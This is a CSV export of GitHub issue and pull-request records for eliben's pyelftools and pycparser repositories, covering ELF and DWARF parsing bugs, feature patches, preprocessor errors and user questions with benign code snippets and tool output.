eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/13,20902991,MDExOlB1bGxSZXF1ZXN0OTA0Mzk1Mg==,13,first stab at a pahole equivalent.,205466,closed,FALSE,NA,NA,2,2013-10-12T01:11:40Z,2014-11-01T13:16:30Z,2014-11-01T13:16:30Z,NONE,NA,"first stab at a pahole equivalent.
it's not too pretty, but it's not too shabby either.

testing done:

```
(pypy-elf)# damien@localhost ~/Work/github/pyelftools [17:57:51]> gcc -g -o examples/sample_structs.elf examples/sample_structs.c
(pypy-elf)# damien@localhost ~/Work/github/pyelftools [17:58:05]> time python examples/pahole.py examples/sample_structs.elf
Processing file: examples/sample_structs.elf
Compile unit examples/sample_structs.c
45[45]: type long unsigned int;
52[52]: type unsigned char;
59[59]: type short unsigned int;
66[66]: type unsigned int;
73[73]: type signed char;
80[80]: type short int;
87[87]: type int;
94[94]: type long int;
109[109]: type char;
      union __unknown_116 {
        long int *           pointer_to_long;
        char *               pointer_to_string;
        void * * *           triple_void_indirection;
      }
      struct namedFoo {
        int                  some_int;
        char                 some_character;
        volatile long unsigned int [12] some_volatile_unsigned_long_array;
        union __unknown_116  some_union;
        int                  seven_bits;
        int                  remaining_bit;
        const struct namedFoo * self;
      }
315[315]: typedef namedFoo struct namedFoo;
      struct __unknown_326 {
        int                  member;
      }
347[347]: typedef anonymousStruct struct __unknown_326;

real    0m0.500s
user    0m0.235s
sys     0m0.262s
```
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/13/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/13/comments,https://api.github.com/repos/eliben/pyelftools/issues/13/events,https://github.com/eliben/pyelftools/pull/13,https://api.github.com/repos/eliben/pyelftools/pulls/13
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/12,19545573,MDU6SXNzdWUxOTU0NTU3Mw==,12,Compute Elf File Size,315964,closed,FALSE,NA,NA,6,2013-09-16T11:36:12Z,2016-09-18T14:12:31Z,2014-11-01T13:19:38Z,NONE,NA,"Hello Eli!
I love your project and because I need to be able to extract elf files from a stream of data I want to be able to calculate the file size by parsing the headers+program sections.
I had in mind two ways to calculate the effective file size but none work so far.
The first approach is sum up: header + program headers + section headers+ program sections.
The second approach is sum up: last program section + file size + header table size.
I have tried the function against your elf samples and they underestimate the file size.
Could you tell me what I am missing in my calculation?

```
def compute_file_size(self):
    self._emitline('File size:')
    header_size=self.elffile.header['e_ehsize'];
    table_program_size=self.elffile.header['e_phentsize']*self.elffile.header['e_phnum'];
    table_headers_size=self.elffile.header['e_shnum']*self.elffile.header['e_shentsize'];

    if self.elffile.num_segments() == 0:
        self._emitline('There are no program headers in this file.')
        return
    program_size=0
    #get the last segmment
    last_offset=0
    last_size=0
    for segment in self.elffile.iter_segments():
        program_size+=segment['p_filesz']
        if segment['p_offset']>last_offset:
            last_offset=segment['p_offset']
            last_size=segment['p_filesz']
    print ""Last Offset "", self._format_hex(segment['p_offset'], fieldsize=6)
    print ""Last Size"", self._format_hex(segment['p_filesz'], fieldsize=5)
    total_size=header_size+table_program_size+table_headers_size+program_size
    print ""Total Size via segments %d bytes \n""% (total_size)
    print ""Total Size via offset   %d bytes \n""% (last_offset+last_size+table_headers_size)
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/12/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/12/comments,https://api.github.com/repos/eliben/pyelftools/issues/12/events,https://github.com/eliben/pyelftools/issues/12,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/11,18480860,MDU6SXNzdWUxODQ4MDg2MA==,11,get_dwarf_info() call takes several seconds to complete,948471,closed,FALSE,NA,NA,4,2013-08-23T16:58:27Z,2016-10-16T20:57:52Z,2016-10-16T20:57:52Z,NONE,NA,"For a moderately sized binary with about 25000 DIEs this library takes several seconds to return from a call to get_dwarf_info(), even with pypy, which makes it unsuitable for several purposes. Please optimize this. I'm only interested in a a few of the DIEs with certain tags so there must be many, may cycles wasted on indexing and creating objects that are never looked at once.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/11/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/11/comments,https://api.github.com/repos/eliben/pyelftools/issues/11/events,https://github.com/eliben/pyelftools/issues/11,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/10,16534843,MDExOlB1bGxSZXF1ZXN0NjgxMTY5Ng==,10,"Correctly handle the ""multiple string tables"" case for string resolution...",1625201,closed,FALSE,NA,NA,10,2013-07-09T16:41:50Z,2014-07-03T16:08:08Z,2014-01-08T13:53:26Z,CONTRIBUTOR,NA,"Hi Eli,

Here is a little fix for a problem I've met with an elf file containing two 'dynstr' sections.
pyelftools was crashing while iterating throught dynamic tags because it looked for the string table using the 'dynstr' name and picked the wrong one.

After some research, it seems that the good string table to use is given by the DT_STRTAB dynamic tag in the dynamic table itself. 
The following patch changes the dynamic section code so it finds and use the string table section pointed at by this DT_STRTAB dynamic tag.

Yann
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/10/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/10/comments,https://api.github.com/repos/eliben/pyelftools/issues/10/events,https://github.com/eliben/pyelftools/pull/10,https://api.github.com/repos/eliben/pyelftools/pulls/10
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/9,16340604,MDExOlB1bGxSZXF1ZXN0NjcxNzI3NQ==,9,Use correct iterator for an OrderedDict,4881193,closed,FALSE,NA,NA,5,2013-07-03T20:59:01Z,2013-12-27T17:53:21Z,2013-12-27T17:53:06Z,CONTRIBUTOR,NA,"Attempting to ""print(DIE)"" fails without this change.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/9/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/9/comments,https://api.github.com/repos/eliben/pyelftools/issues/9/events,https://github.com/eliben/pyelftools/pull/9,https://api.github.com/repos/eliben/pyelftools/pulls/9
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/8,16173287,MDExOlB1bGxSZXF1ZXN0NjYzMjkwMw==,8,Emit the full path for filenames.,4881193,closed,FALSE,NA,NA,4,2013-06-29T10:08:31Z,2014-06-16T15:43:13Z,2013-12-27T12:41:14Z,CONTRIBUTOR,NA,"The full name of a file is the concatenation of DW_AT_comp_dir and DW_AT_name where either can actually be missing. This patch handles all the cases I have seen, notably the exception when DW_AT_name is the missing attribute.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/8/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/8/comments,https://api.github.com/repos/eliben/pyelftools/issues/8/events,https://github.com/eliben/pyelftools/pull/8,https://api.github.com/repos/eliben/pyelftools/pulls/8
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/7,15770683,MDExOlB1bGxSZXF1ZXN0NjQyOTU3MQ==,7,add support for solaris .SUNW_ldynsym section,1625201,closed,FALSE,NA,NA,1,2013-06-19T21:53:57Z,2013-12-27T14:42:50Z,2013-12-27T14:42:50Z,CONTRIBUTOR,NA,"Hi Eli,

A new push request to add support for .SUNW_ldynsym section which is basically a symbol table for local symbols, that can be used by debuggers (some explanations here: https://blogs.oracle.com/ali/entry/what_is_sunw_ldynsym for more information).

Yann
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/7/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/7/comments,https://api.github.com/repos/eliben/pyelftools/issues/7/events,https://github.com/eliben/pyelftools/pull/7,https://api.github.com/repos/eliben/pyelftools/pulls/7
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/6,15733467,MDExOlB1bGxSZXF1ZXN0NjQwOTY3MA==,6,Update instructions for getting the current code,79528,closed,FALSE,NA,NA,0,2013-06-19T08:52:19Z,2014-08-13T02:33:00Z,2013-06-19T12:46:55Z,CONTRIBUTOR,NA,"pyelftools no longer uses Mercurial. So update the instructions for getting the current code.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/6/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/6/comments,https://api.github.com/repos/eliben/pyelftools/issues/6/events,https://github.com/eliben/pyelftools/pull/6,https://api.github.com/repos/eliben/pyelftools/pulls/6
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/5,15627593,MDExOlB1bGxSZXF1ZXN0NjM1NjM3MA==,5,add support for solaris additional visibility specifications,1625201,closed,FALSE,NA,NA,0,2013-06-17T11:23:44Z,2013-12-27T14:43:29Z,2013-12-27T14:43:29Z,CONTRIBUTOR,NA,"A new tiny patch to add some visibility values that are defined at least in Solaris (documented here http://docs.oracle.com/cd/E19963-01/html/819-0690/chapter6-93046.html#chapter7-27).

I updated the descriptions dict for visibility even if readelf doesn't currently display correctly these values.

Yann
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/5/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/5/comments,https://api.github.com/repos/eliben/pyelftools/issues/5/events,https://github.com/eliben/pyelftools/pull/5,https://api.github.com/repos/eliben/pyelftools/pulls/5
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/4,15609002,MDExOlB1bGxSZXF1ZXN0NjM0ODE2NQ==,4,Fix a mistake in symbol visibility description string table,1625201,closed,FALSE,NA,NA,0,2013-06-16T18:56:22Z,2014-07-29T01:54:35Z,2013-06-16T23:21:11Z,CONTRIBUTOR,NA,"Hi Eli, 

Here's a tiny pull request to fix a little mistake I noticed in describe_symbol_visibility while working on adding support for .SUNW_ldynsym section (new pull request coming soon for this one).

Yann
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/4/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/4/comments,https://api.github.com/repos/eliben/pyelftools/issues/4/events,https://github.com/eliben/pyelftools/pull/4,https://api.github.com/repos/eliben/pyelftools/pulls/4
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/3,15320278,MDU6SXNzdWUxNTMyMDI3OA==,3, support parsing of dynamic ELFs w/out section headers,1130906,closed,FALSE,NA,NA,4,2013-06-09T13:55:39Z,2014-06-17T12:48:07Z,2014-06-17T12:48:07Z,OWNER,NA,"Moving from bitbucket pull request #11 by Mike Frysinger:

support parsing of dynamic ELFs w/out section headers

At runtime, ELFs do not use the section headers at all. Instead, only
the program segments and dynamic tags get used. This means you can
strip the section table completely from an ELF and have it still work.

In practice, people rarely do this, but it's not unheard of. Make the
Dynamic tags work even in these cases by loading the strings table the
same way the runtime loader does:
- parse the symtab address from DT_STRTAB
- locate the file offset via the program segments

In order to avoid circular deps (parsing a dyntag requires walking parsed
dyntags), add a set of internal funcs for returning the raw values.
ave it still work.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/3/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/3/comments,https://api.github.com/repos/eliben/pyelftools/issues/3/events,https://github.com/eliben/pyelftools/issues/3,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/2,15320259,MDU6SXNzdWUxNTMyMDI1OQ==,2,Trying to get LMA and VMA addresses,1130906,closed,FALSE,NA,NA,4,2013-06-09T13:53:39Z,2016-10-26T03:18:52Z,2016-10-26T03:18:52Z,OWNER,NA,"Moved from bitbucket issue #21:

Hi,

I'm using your library to parse a powerpc ELF file and that seems to work great except for VMA address extraction.

I use this code to get VMA address:

with open( elf_file_name, ""rb"" ) as f:
    elf_file = ELFFile( f )
    for i in range( elf_file.num_sections() ):
        section = elf_file.get_section( i )
        segment_header = elf_file._get_segment_header( i )
        print ""Name = %s"" % section.name
        print ""VMA  = 0x%x"" % segment_header[ ""p_paddr"" ]
        print ""LMA  = 0x%x\n"" % section[ ""sh_addr"" ]

(yeah, i know, it's ugly to use private method ""_get_segment_header"" but i found nothing better). The output is:

Name =
VMA  = 0xfc100000
LMA  = 0x0

Name = .text
VMA  = 0xfc200000
LMA  = 0x0

Name = .rodata
VMA  = 0xfc300000
LMA  = 0x273d8

Name = .data
VMA  = 0xfc400000
LMA  = 0x800000

Name = .stacks
VMA  = 0xfc500000
LMA  = 0x800a80

Name = .bss
VMA  = 0xfc600000
LMA  = 0x812a80
...

and objdump -h output:

main:     file format elf32-powerpc

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .text         000273d8  00000000  fc100000  00001000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  1 .rodata       000041a0  000273d8  fc200000  000283d8  2**3
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  2 .data         00000a7c  00800000  fc300000  0002d000  2**3
                  CONTENTS, ALLOC, LOAD, DATA
  3 .stacks       00012000  00800a80  fc300a80  0002da80  2**4
                  CONTENTS, ALLOC, LOAD, DATA
  4 .bss          00089c88  00812a80  fc312a80  0003fa80  2**5
                  ALLOC
  ...

So section's name and VMA address are incorrect :( It's the correct way to do that or it's a bug ?

Thx
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/2/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/2/comments,https://api.github.com/repos/eliben/pyelftools/issues/2/events,https://github.com/eliben/pyelftools/issues/2,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/1,15320225,MDU6SXNzdWUxNTMyMDIyNQ==,1,Support for shared lineprograms,1130906,open,FALSE,NA,NA,3,2013-06-09T13:50:13Z,2016-10-26T03:19:25Z,NA,OWNER,NA,"Moving from bitbucket issue #22:

Attached is an ELF file for which readelf from pyelftools behaves differently than GNU readelf.

The reason is that the file consists of multiple compilation units that share a single lineprogram. When executing readelf --debug-dump=decodedline <file>, GNU readelf prints the source lines a single time, whereas readelf from pyelftools prints the same source lines once for every compilation unit.

Should we treat lineprograms as entities that are independent of compilation units?

---

My comments:

Yeah, I can reproduce the difference... Though it's just different behavior from readelf; all information seems to be parsed correctly. I'll take a look at how to make it behave similarly.

[...]

OK, I see what the problem is.

pyelftools enumerates line programs by following each CU and looking at its line program. readelf just goes over the line program section, and extracts the CU name from the line program itself.

This shouldn't be hard to fix by adding a method to DWARFInfo that enumerates line programs in order from the section and not looking up by CU.

Patches welcome!
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/1/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/1/comments,https://api.github.com/repos/eliben/pyelftools/issues/1/events,https://github.com/eliben/pyelftools/issues/1,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/415,855423474,MDU6SXNzdWU4NTU0MjM0NzQ=,415,UnicodeDecodeError during cpp step,2229288,open,FALSE,NA,NA,2,2021-04-11T22:30:03Z,2021-04-18T17:39:22Z,NA,NONE,NA,"I'm using the standard `parse_file(filepath, use_cpp=True)`  call to parse my C files.  Some of my files have special unicode characters, such as `“` and `”`.  During the `cpp` step, it is failing with a `UnicodeDecodeError`.  I found that Python's `subprocess.check_output()` takes an optional parameter called `encoding`.  When I set `encoding='utf-8'`, then `parse_file()` succeeds.

Specifically, making the following change to `preprocess_file()` in `pycparser/__init__.py` fixes my issue:
```python
        # Note the use of universal_newlines to treat all newlines
        # as \n for Python's purpose
        text = check_output(path_list, universal_newlines=True, encoding='utf-8')
```

I am running my code from a vanilla Windows 10 Command Prompt.

I would propose adding a new optional parameter to `preprocess_file()` to allow a caller to specify this encoding, but there might be a better way--I don't do much Python dev.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/415/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/415/comments,https://api.github.com/repos/eliben/pycparser/issues/415/events,https://github.com/eliben/pycparser/issues/415,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/413,840136018,MDU6SXNzdWU4NDAxMzYwMTg=,413,Install from pip doesn't include fake include utils/fake_libc_include,26259753,closed,FALSE,NA,NA,2,2021-03-24T20:23:30Z,2021-03-24T21:32:00Z,2021-03-24T21:30:33Z,NONE,NA,Install from pip doesn't include fake include `utils/fake_libc_include`. Is this something that was left out intentionally?,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/413/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/413/comments,https://api.github.com/repos/eliben/pycparser/issues/413/events,https://github.com/eliben/pycparser/issues/413,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/412,834681801,MDU6SXNzdWU4MzQ2ODE4MDE=,412,"why this ""#error"" raise errors ?",53017181,open,FALSE,NA,NA,4,2021-03-18T11:15:15Z,2021-03-24T15:05:41Z,NA,NONE,NA,"I have C files to parse, and in one of them, I have some code that should be compiled with GHS, 

```
#ifdef __ghs__

/* Allocate initialized static variables in default/SRL section */
#pragma ghs section data=default
#ifdef __ghs_sda
//#pragma ghs section sdata=default
#endif

#else
	#error ""Relocation to QM sections is compiler-dependent. The pragma used in this file work only with GHS compiler.""
#endif
```

I got an error that indicates ""returned non-zero exit status 1""

Is there any solution or at least a way to ignore this case ?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/412/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/412/comments,https://api.github.com/repos/eliben/pycparser/issues/412/events,https://github.com/eliben/pycparser/issues/412,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/411,834281074,MDU6SXNzdWU4MzQyODEwNzQ=,411,Reported coordinates not accurate for BinaryOp while getting json dump of AST,65557029,open,FALSE,NA,NA,4,2021-03-18T00:32:56Z,2021-03-18T18:05:22Z,NA,NONE,NA,"Look at this code:

```
#include<stdio.h>
int main(int argc, char \*argv[]) { 
	int a,i,j,k;
	scanf(""%d"",&a);
	k=a%10;
	j=a/10%10;
	if(a>0)
		printf(""%d"",a);
	else 
	{
		if(k>j)
			printf(""%d"",a/100\*10+k);
		
		else printf(""%d"",a/10);

	}
	return 0;
}
```

And consider the only the JSON output for only the binary operators:
```
{'_nodetype': 'BinaryOp', 'coord': '313-A-bug-16465019-16465065/313-A-16465065.c:6:4', 'left': {'_nodetype': 'BinaryOp', 'coord': '313-A-bug-16465019-16465065/313-A-16465065.c:6:4', 'left': {'_nodetype': 'ID', 'coord': '313-A-bug-16465019-16465065/313-A-16465065.c:6:4', 'name': 'a'}, 'op': '/', 'right': {'_nodetype': 'Constant', 'coord': '313-A-bug-16465019-16465065/313-A-16465065.c:6:6', 'type': 'int', 'value': '10'}}, 'op': '%', 'right': {'_nodetype': 'Constant', 'coord': '313-A-bug-16465019-16465065/313-A-16465065.c:6:9', 'type': 'int', 'value': '10'}}

{'_nodetype': 'BinaryOp', 'coord': '313-A-bug-16465019-16465065/313-A-16465065.c:6:4', 'left': {'_nodetype': 'ID', 'coord': '313-A-bug-16465019-16465065/313-A-16465065.c:6:4', 'name': 'a'}, 'op': '/', 'right': {'_nodetype': 'Constant', 'coord': '313-A-bug-16465019-16465065/313-A-16465065.c:6:6', 'type': 'int', 'value': '10'}}
```

How can the coordinates 6:4 have 2 operators? (namely '%' and '/')
This is the line in question:
`	j=a/10%10;`

Am I missing something or is this the expected behavior?
I've only included the sections of the JSON in question for easier readability.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/411/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/411/comments,https://api.github.com/repos/eliben/pycparser/issues/411/events,https://github.com/eliben/pycparser/issues/411,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/410,833421230,MDU6SXNzdWU4MzM0MjEyMzA=,410,Possible issue with pre-processing with cpp,65557029,closed,FALSE,NA,NA,3,2021-03-17T05:40:23Z,2021-03-17T15:32:29Z,2021-03-17T12:10:25Z,NONE,NA,"I'm trying to run the examples c-to-c and c_json. However, I keep running into similar errors. 
I'm on Ubuntu 20.04 with gcc 9.3.
Here's the traceback for the c_json run:

Traceback (most recent call last):
  File ""main.py"", line 161, in <module>
    ast_dict = file_to_dict(sys.argv[1])
  File ""main.py"", line 95, in file_to_dict
    ast = parse_file(filename, use_cpp=True)
  File ""/home/akashdutta/.local/lib/python3.8/site-packages/pycparser/__init__.py"", line 90, in parse_file
    return parser.parse(text, filename)
  File ""/home/akashdutta/.local/lib/python3.8/site-packages/pycparser/c_parser.py"", line 149, in parse
    return self.cparser.parse(
  File ""/home/akashdutta/.local/lib/python3.8/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/home/akashdutta/.local/lib/python3.8/site-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/home/akashdutta/.local/lib/python3.8/site-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/home/akashdutta/.local/lib/python3.8/site-packages/pycparser/c_parser.py"", line 1858, in p_error
    self._parse_error(
  File ""/home/akashdutta/.local/lib/python3.8/site-packages/pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/lib/gcc/x86_64-linux-gnu/9/include/stdarg.h:40:27: before: __gnuc_va_list
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/410/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/410/comments,https://api.github.com/repos/eliben/pycparser/issues/410/events,https://github.com/eliben/pycparser/issues/410,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/409,829964907,MDExOlB1bGxSZXF1ZXN0NTkxNTQ2NDcw,409,fixing limits in fake includes,9336784,closed,FALSE,NA,NA,1,2021-03-12T10:15:35Z,2021-03-16T12:29:11Z,2021-03-16T12:29:11Z,CONTRIBUTOR,NA,The defines of limits.h in `utils/fake_libc_include/_fake_defines.h` were partly wrong or missing. ,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/409/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/409/comments,https://api.github.com/repos/eliben/pycparser/issues/409/events,https://github.com/eliben/pycparser/pull/409,https://api.github.com/repos/eliben/pycparser/pulls/409
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/408,815305146,MDU6SXNzdWU4MTUzMDUxNDY=,408,Not able to parse testfile (pycparser.plyparser.ParseError: example_c_file.c:1:1: before: /),10099533,closed,FALSE,NA,NA,1,2021-02-24T09:45:54Z,2021-02-27T00:24:53Z,2021-02-27T00:24:53Z,NONE,NA,"Hi,

I tried to parse the ""example_c_file.c"" file, but I get the error:
pycparser.plyparser.ParseError: test.c:1:1: before: /

I tried with pycparser 2.20 on Windows 10

from pycparser import c_parser, c_ast, parse_file

def run(filename):
    ast = parse_file(filename)
    ast.show(showcoord=True)
    print(ast)

if __name__ == ""__main__"":
    filename = ""example_c_file.c""
    run(filename)",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/408/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/408/comments,https://api.github.com/repos/eliben/pycparser/issues/408/events,https://github.com/eliben/pycparser/issues/408,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/407,800841424,MDU6SXNzdWU4MDA4NDE0MjQ=,407,Implicit/Omitted Type Error,45269130,closed,FALSE,NA,NA,1,2021-02-04T01:18:58Z,2021-02-04T01:55:28Z,2021-02-04T01:55:28Z,NONE,NA,"First of all, thank you very much for this parser! It is really useful.

I am working on a project that has to create C code that violates best practices/guideline rules (e.g. MISRA).
One of the rules states that types have to explicitly be specified.
E.g. this is my example code, that should be emitted by the c parser:

>static a = 0;

GNU GCC has no problems compiling this code via `gcc -std=c99` (with Wimplicit-int warning).
pycparser is raising this exception:
>Traceback (most recent call last):
>  File ""/tmp/test/./test.py"", line 10, in <module>
>    ast = parser.parse(text)
>  File ""/usr/lib/python3.9/site-packages/pycparser/c_parser.py"", line 149, in parse
>    return self.cparser.parse(
>  File ""/usr/lib/python3.9/site-packages/pycparser/ply/yacc.py"", line 331, in parse
>    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
>  File ""/usr/lib/python3.9/site-packages/pycparser/ply/yacc.py"", line 1118, in parseopt_notrack
>    p.callable(pslice)
>  File ""/usr/lib/python3.9/site-packages/pycparser/c_parser.py"", line 718, in p_decl_body
>    decls = self._build_declarations(
>  File ""/usr/lib/python3.9/site-packages/pycparser/c_parser.py"", line 449, in _build_declarations
>    fixed_decl = self._fix_decl_name_type(declaration, spec['type'])
>  File ""/usr/lib/python3.9/site-packages/pycparser/c_parser.py"", line 337, in _fix_decl_name_type
>    self._parse_error(
>  File ""/usr/lib/python3.9/site-packages/pycparser/plyparser.py"", line 67, in _parse_error
>    raise ParseError(""%s: %s"" % (coord, msg))
>pycparser.plyparser.ParseError: :2:8: Missing type in declaration

using this minimal example:
>#!/usr/bin/env python
>from pycparser import c_parser
>
>text = r""""""
>static a = 0;
>""""""
>
>if __name__ == '__main__':
>    parser = c_parser.CParser()
>    ast = parser.parse(text)


Is there any chance that this will be fixed?
Although this is preventing correct code to be parsed (reading the file above)",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/407/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/407/comments,https://api.github.com/repos/eliben/pycparser/issues/407/events,https://github.com/eliben/pycparser/issues/407,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/406,800572075,MDU6SXNzdWU4MDA1NzIwNzU=,406,AST Plot,26186702,closed,FALSE,NA,NA,2,2021-02-03T18:08:07Z,2021-02-04T18:59:08Z,2021-02-04T18:59:08Z,NONE,NA,"Hi, is there a way to plot the ast tree?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/406/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/406/comments,https://api.github.com/repos/eliben/pycparser/issues/406/events,https://github.com/eliben/pycparser/issues/406,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/404,795875862,MDExOlB1bGxSZXF1ZXN0NTYzMTQ5OTUx,404,Added .editorconfig,240344,closed,FALSE,NA,NA,1,2021-01-28T10:29:48Z,2021-01-28T13:23:55Z,2021-01-28T13:04:18Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/404/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/404/comments,https://api.github.com/repos/eliben/pycparser/issues/404/events,https://github.com/eliben/pycparser/pull/404,https://api.github.com/repos/eliben/pycparser/pulls/404
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/403,795875708,MDExOlB1bGxSZXF1ZXN0NTYzMTQ5ODI1,403,Moved the metadata into setup.cfg,240344,closed,FALSE,NA,NA,2,2021-01-28T10:29:36Z,2021-01-28T17:08:11Z,2021-01-28T14:32:28Z,NONE,NA,"Added pyproject.toml.
Version is fetched from git tags.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/403/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/403/comments,https://api.github.com/repos/eliben/pycparser/issues/403/events,https://github.com/eliben/pycparser/pull/403,https://api.github.com/repos/eliben/pycparser/pulls/403
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/402,776660518,MDU6SXNzdWU3NzY2NjA1MTg=,402,Open to single-line comment removal?,411832,closed,FALSE,NA,NA,2,2020-12-30T22:25:34Z,2021-01-03T18:37:28Z,2021-01-03T14:15:45Z,NONE,NA,"Hi! Thanks for the great project.

I found that unlike GNU's `cpp`, Apple's `cpp` (clang on macOS) does not replace single-line comments (`//`) using any of the C-language standards, though it does do this for C++ (`cpp -xc++`).

I found some of the previous issues (#102, #217) regarding comments and understand supporting them in the AST would be complicated as they can appear almost anywhere according to C99's 6.4.9 ""Comments"" section, but I'm curious if either one of the following options would be acceptable to allow pycparser to work more cleanly out of the box across platforms:

1. Preprocess single-line comments, defined in C99 6.4.9 (2), replacing them with a single space, as defined in C99 5.1.1 (2)(3), and _not_ include them in the AST
2. Adjust `parse_file`'s and `preprocess_file`'s default argument of `cpp_args` from `''` to `'-xc++'`, however I don't know if there are C++-specific caveats or other preprocessors that will break if this is enabled by default.

I'm specifically using:
```
tigerblood:/Users/samy/p$ cpp --version
Apple clang version 11.0.0 (clang-1100.0.33.17)
Target: x86_64-apple-darwin18.7.0
Thread model: posix
InstalledDir: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin
```

I'm happy to submit a PR if so.

Thanks!",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/402/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/402/comments,https://api.github.com/repos/eliben/pycparser/issues/402/events,https://github.com/eliben/pycparser/issues/402,NA
